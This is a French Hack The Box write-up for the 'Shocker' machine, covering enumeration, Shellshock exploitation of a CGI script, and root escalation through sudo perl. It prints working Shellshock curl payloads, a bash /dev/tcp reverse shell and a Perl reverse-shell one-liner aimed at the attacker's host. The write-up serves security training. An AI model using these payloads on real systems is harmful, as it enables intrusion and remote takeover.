---
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

title: "Shocker — HTB Easy Writeup & Walkthrough"
linkTitle: "Shocker"
slug: "shocker"
date: 2025-11-21T15:40:23+01:00
#lastmod: 2025-11-21T15:40:23+01:00
draft: false
#robotsNoIndex: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "CGI vulnérable, exploitation de Shellshock et escalade de privilèges jusqu’au root via sudo Perl."
description: "Writeup de Shocker (HTB Easy) : walkthrough pas à pas avec identification d’un CGI vulnérable, exploitation de Shellshock et accès root obtenu étape après étape."
tags: ["Hack The Box","HTB Easy","Web","CGI","Shellshock","linux-privesc","sudo","Perl"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Shocker sur HackTheBox vulnérable à Shellshock via un script CGI"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Shocker"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "4h"
  # vpn_ip: "10.10.x.x"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true
---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Shocker> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

Dans ce writeup, tu vas découvrir **Shocker**, une machine **Easy** de Hack The Box idéale pour s’entraîner à l’exploitation de **Shellshock** à travers un script CGI exposé dans le répertoire `/cgi-bin/`.

Grâce à une énumération méthodique, tu identifies progressivement le vecteur d’attaque, puis tu exploites le script `user.sh` pour obtenir un premier accès au système sous l’utilisateur *shelly*. La suite du challenge te permet ensuite de réaliser une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.

**Ce writeup montre comment une énumération rigoureuse permet d’identifier un CGI exposé, de confirmer l’exploitation de Shellshock, puis d’obtenir un accès root étape par étape.**



---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :


```txt
# Nmap 7.95 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.x.x)
Host is up (0.0069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 7.47 seconds
```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```txt
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour shocker.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"80,2222" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "shocker.htb"

# Nmap 7.95 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p80,2222 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt shocker.htb
Nmap scan report for shocker.htb (10.129.x.x)
Host is up (0.0070s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT     ADDRESS
1   6.59 ms 10.10.x.x
2   6.86 ms shocker.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.41 seconds

```

### Scan ciblé CMS

Résultats du scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```txt
# Nmap 7.95 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p80,2222 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.x.x)
Host is up (0.0072s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
|   ETag: "89-559ccac257884"
|   Accept-Ranges: bytes
|   Content-Length: 137
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 18.26 seconds

```



### Scan UDP rapide

Résultats du scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).

```txt
# Nmap 7.95 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.x.x)
Host is up (0.0080s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 9.43 seconds

```



### Énumération des chemins web

Pour la partie découverte de chemins web, utilise le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb shocker.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier **`RESULTS_SUMMARY.txt`** te permet d’identifier rapidement les chemins intéressants sans parcourir tous les logs.

Même si le site semble presque vide, cette étape reste indispensable.  

L’énumération de répertoires permet souvent de découvrir des chemins techniques non exposés dans l’interface web, comme des dossiers d’administration, des API internes ou des répertoires de scripts.

```txt
===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/dev/mon-recoweb-dev
Script              : mon-recoweb-dev v2.1.0

Cible        : shocker.htb
Périmètre    : /
Date début   : [date] 11:23:56

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://shocker.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://shocker.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://shocker.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/. (CODE:200|SIZE:137)
http://shocker.htb/.htaccess.bak (CODE:403|SIZE:299)
http://shocker.htb/.htaccess (CODE:403|SIZE:295)
http://shocker.htb/.htc (CODE:403|SIZE:290)
http://shocker.htb/.ht (CODE:403|SIZE:289)
http://shocker.htb/.htgroup (CODE:403|SIZE:294)
http://shocker.htb/.htm (CODE:403|SIZE:290)
http://shocker.htb/.html (CODE:403|SIZE:291)
http://shocker.htb/.htpasswd (CODE:403|SIZE:295)
http://shocker.htb/.htpasswds (CODE:403|SIZE:296)
http://shocker.htb/.htuser (CODE:403|SIZE:293)
http://shocker.htb/index.html (CODE:200|SIZE:137)
http://shocker.htb/server-status (CODE:403|SIZE:299)
http://shocker.htb/server-status/ (CODE:403|SIZE:299)

=== Détails par outil ===

[DIRB]
http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/index.html (CODE:200|SIZE:137)
http://shocker.htb/server-status (CODE:403|SIZE:299)

[FFUF — DIRECTORIES]
http://shocker.htb/server-status/ (CODE:403|SIZE:299)

[FFUF — FILES]
http://shocker.htb/. (CODE:200|SIZE:137)
http://shocker.htb/.htaccess.bak (CODE:403|SIZE:299)
http://shocker.htb/.htaccess (CODE:403|SIZE:295)
http://shocker.htb/.htc (CODE:403|SIZE:290)
http://shocker.htb/.ht (CODE:403|SIZE:289)
http://shocker.htb/.htgroup (CODE:403|SIZE:294)
http://shocker.htb/.htm (CODE:403|SIZE:290)
http://shocker.htb/.html (CODE:403|SIZE:291)
http://shocker.htb/.htpasswd (CODE:403|SIZE:295)
http://shocker.htb/.htpasswds (CODE:403|SIZE:296)
http://shocker.htb/.htuser (CODE:403|SIZE:293)
http://shocker.htb/index.html (CODE:200|SIZE:137)


```

### Recherche de vhosts

Enfin, teste rapidement la présence de vhosts avec  le script {{< script "mon-subdomains" >}}

```bash
mon-subdomains shocker.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```
Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.

```txt
=== mon-subdomains shocker.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : [date] 18:45:57
Domaine      : shocker.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=137 words=13 (Host=zhd4htxy6w.shocker.htb)
  Baseline#2: code=200 size=137 words=13 (Host=trkcky4t3v.shocker.htb)
  Baseline#3: code=200 size=137 words=13 (Host=rovm8c9i6k.shocker.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains shocker.htb END ===
                                                                    
```

{{< script "mon-subdomains" >}} n'a révélé aucun vhost exploitable, ce qui confirme que l'analyse doit se concentrer sur le port 80 et ses endpoints.

## Prise pied

### Analyse de l’image

Le site web exposé par la machine est extrêmement minimaliste : il se limite à une seule page affichant une image, *bug.jpg*, sans lien, formulaire ni fonctionnalité apparente. Face à une surface d’attaque aussi réduite, il est naturel de se demander si cette image ne dissimule pas une information utile à la progression.

Tu commences donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "outils-steganographie" >}}**, afin de vérifier la présence éventuelle d’un fichier embarqué, de métadonnées exploitables ou d’un indice caché.

Après avoir appliqué plusieurs techniques, en commençant notamment par **stegseek**, aucun élément pertinent n’est mis en évidence. Cette étape permet ainsi de confirmer que **l’image ne constitue pas un vecteur d’exploitation** dans ce challenge.



![Machine Shocker sur Hack The Box affichant une page web minimaliste avec une image bug.jpg](shocker-shellshock-bug.jpg)

### Scan du `/cgi-bin/`

La découverte du répertoire `/cgi-bin/` constitue un indice particulièrement intéressant.  
Dans une configuration **Apache classique**, ce dossier est utilisé pour héberger des **scripts CGI** exécutés directement par le serveur web.

Historiquement, ce type de mécanisme a souvent été associé à des vulnérabilités importantes, notamment **Shellshock**, qui permet d’exécuter des commandes système lorsque des scripts Bash sont exposés via CGI.

Il faut toutefois garder à l’esprit que ce type de vulnérabilité n’est **pas toujours détecté automatiquement lors d’un scan agressif**. Les outils de scan testent généralement une liste limitée de scripts CGI standards. Si le script réellement présent sur la cible ne fait pas partie de cette liste, la vulnérabilité peut passer inaperçue.

Lorsqu’un répertoire `/cgi-bin/` est identifié, il devient donc pertinent de **réaliser une énumération spécifique de ce dossier** afin de découvrir les scripts réellement présents sur la machine.

Tu lances alors un scan ciblé du répertoire `/cgi-bin/` pour identifier d’éventuels scripts exécutables :


```bash
mon-recoweb shocker.htb/cgi-bin/ --ext ".sh,.cgi,.pl"
```

```txt
===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/dev/mon-recoweb-dev
Script              : mon-recoweb-dev v2.1.0

Cible        : shocker.htb
Périmètre    : /cgi-bin/
Date début   : [date] 11:26:26

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://shocker.htb/cgi-bin/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/cgi-bin/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://shocker.htb/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/cgi-bin/ffuf_dirs.json 2>&1 | tee scans_recoweb/cgi-bin/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://shocker.htb/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 30 -timeout 10 -fc 404 -e .sh\,.cgi\,.pl -of json -o scans_recoweb/cgi-bin/ffuf_files.json 2>&1 | tee scans_recoweb/cgi-bin/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/cgi-bin/.htaccess.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htaccess (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htaccess.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htaccess.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.hta.cgi (CODE:403|SIZE:302)
http://shocker.htb/cgi-bin/.hta (CODE:403|SIZE:298)
http://shocker.htb/cgi-bin/.hta.pl (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.hta.sh (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.htpasswd.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htpasswd (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htpasswd.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htpasswd.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/user.sh (CODE:200|SIZE:126)

=== Détails par outil ===

[DIRB]

[FFUF — DIRECTORIES]

[FFUF — FILES]
http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/cgi-bin/.htaccess.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htaccess (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htaccess.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htaccess.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.hta.cgi (CODE:403|SIZE:302)
http://shocker.htb/cgi-bin/.hta (CODE:403|SIZE:298)
http://shocker.htb/cgi-bin/.hta.pl (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.hta.sh (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.htpasswd.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htpasswd (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htpasswd.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htpasswd.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/user.sh (CODE:200|SIZE:126)
                               
```

La présence du script `user.sh` dans le répertoire `/cgi-bin/` constitue un indice particulièrement intéressant. Il s’agit d’un **script Bash potentiellement exécuté via CGI**, un contexte historiquement associé à la vulnérabilité **Shellshock**.

### Vérification de Shellshock

Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULNERABLE`).  
L’objectif est de vérifier si le script CGI interprète cet en-tête comme du code Bash, conformément au mécanisme d’exploitation de la vulnérabilité **Shellshock**.

Ce test volontairement simple permet de confirmer rapidement si la commande injectée est exécutée par le serveur.

Si le serveur exécute la commande et renvoie la chaîne attendue dans la réponse HTTP, cela confirme que le script CGI interprète l’en-tête comme du code Bash et qu’il est donc **vulnérable à Shellshock**.

Lance la commande :

```bash
curl -H 'User-Agent: () { :; }; echo; echo VULNERABLE' http://shocker.htb/cgi-bin/user.sh
```

et tu obtiens :

```bash
VULNERABLE
Content-Type: text/plain
Just an uptime test script

 05:37:23 up 19:59,  0 users,  load average: 0.00, 0.00, 0.00
```

La présence de la chaîne `VULNERABLE` dans la réponse confirme que la commande injectée est bien exécutée sur la machine cible.

------

Pour confirmer l’exploitation et identifier le contexte d’exécution du script, tu remplaces ensuite la commande précédente par `/usr/bin/id`.

Cette commande permet de déterminer **quel utilisateur exécute le script CGI**, information essentielle pour comprendre les privilèges dont tu disposes sur la machine.

Lance la commande :

```bash
curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh
```

et la réponse est :

```bash
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Cela indique que le script CGI est exécuté avec les privilèges de l’utilisateur **shelly**, ce qui signifie que toute commande injectée via Shellshock s’exécutera dans ce contexte.

> **Note :**
>  Pour approfondir le fonctionnement interne de la vulnérabilité Shellshock, tu peux consulter cette ressource technique :
>  https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html

### Exploitation de Shellshock

La vulnérabilité étant désormais confirmée, tu peux exploiter Shellshock pour obtenir un accès distant sur la machine cible.

Le principe consiste à injecter un payload Bash de reverse shell dans l’en-tête `User-Agent`.  

Le script CGI vulnérable exécute alors cette commande et ouvre une connexion vers ta machine Kali.

#### Préparation du listener dans Kali

Avant d’envoyer le payload, tu démarres un listener Netcat sur ta machine Kali pour recevoir la connexion entrante :

```bash
nc -lvnp 4444
```

Le terminal reste alors en attente d’une connexion.

#### Envoi du reverse shell via Shellshock

Dans un autre terminal, tu envoies la requête HTTP contenant le payload :

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
```

Ce payload est exécuté via Shellshock par le script CGI et initie immédiatement une connexion vers ton listener Netcat.

> Note :
> Pour générer rapidement un payload de reverse shell adapté à ton contexte, tu peux utiliser :
> https://www.revshells.com/

#### Réception du shell

Dans la fenêtre où Netcat est en écoute, la connexion entrante apparaît :

```bash
Listening on 0.0.0.0 4444
Connection received on 10.129.x.x 58744
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

Tu disposes maintenant d’un premier accès shell sur la machine cible et peux commencer à explorer le système.

------

En explorant le système de fichiers, tu identifies rapidement le répertoire personnel de l’utilisateur `shelly`.

```bash
shelly@Shocker:/usr/lib/cgi-bin$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Sep 21  2022 .
drwxr-xr-x 23 root   root   4096 Sep 21  2022 ..
drwxr-xr-x  4 shelly shelly 4096 Sep 21  2022 shelly
```

Tu te rends alors dans le répertoire personnel :

```bash
cd ~
shelly@Shocker:/home/shelly$ ls -la
```

et tu identifies rapidement le fichier **user.txt**.

### user.txt

```bash
shelly@Shocker:/home/shelly$ cat user.txt
caf00xxxxxxxxxxxxxxxxxxxxxxxxxxxe4a7
```

La récupération du fichier **user.txt** confirme que la **prise de pied sur la machine est réussie**.

---

## Escalade de privilèges

{{< escalade-intro user="shelly" >}}



### Sudo -l

Tu commences toujours par vérifier les droits <code>sudo</code> :

```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$
```

### Exploitation de Perl via sudo

Puisque l’utilisateur `shelly` est autorisé à exécuter `perl` avec les privilèges `root` via `sudo`, toute commande lancée avec `sudo perl` sera exécutée avec les privilèges root.

Tu utilises ensuite un payload de reverse shell Perl, par exemple généré avec [revshells.com](https://www.revshells.com/), que tu exécutes avec `sudo perl`.

La commande est alors lancée avec les privilèges root, ce qui permet d’ouvrir une connexion reverse shell vers ta machine Kali.

### Root Shell dans Kali

Lance le listener dans une fenêtre Kali :

```bash
nc -lvnp 12345 
```

et ensuite la commande perl dans une autre fenêtre de Kali :

```bash
sudo perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

et tu verras la connexion arriver :

```bash
Listening on 0.0.0.0 12345
Connection received on 10.129.x.x 34840
root@Shocker:/home/shelly# 
```

Tu obtiens alors un shell `bash` avec les privilèges `root`, que tu peux éventuellement stabiliser à l’aide de la recette {{< recette "stabiliser-reverse-shell" >}} afin de travailler dans un environnement plus confortable.

### root.txt

Une fois le shell root obtenu, il ne reste plus qu’à lire le fichier `root.txt`.

```bash
root@Shocker:/home/shelly# cat /root/root.txt
cat /root/root.txt
be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
```



---

## Conclusion

Cette machine illustre parfaitement l’importance d’une **énumération structurée** et d’une **lecture attentive des indices**, même lorsque la surface d’attaque semble, au premier abord, très limitée.

À partir d’une interface web minimaliste, la découverte du répertoire `/cgi-bin/` oriente rapidement l’analyse vers une piste classique mais toujours pertinente : **les scripts CGI potentiellement vulnérables à Shellshock**.

En validant progressivement l’hypothèse — test de la faille, exécution de commandes simples, puis obtention d’un reverse shell — tu obtiens un premier accès au système avant de conclure par une **élévation de privilèges via `sudo` et Perl**.

**Un excellent challenge Easy pour découvrir Shellshock et comprendre l’importance d’une énumération méthodique dans un CTF.**



{{< feedback >}}
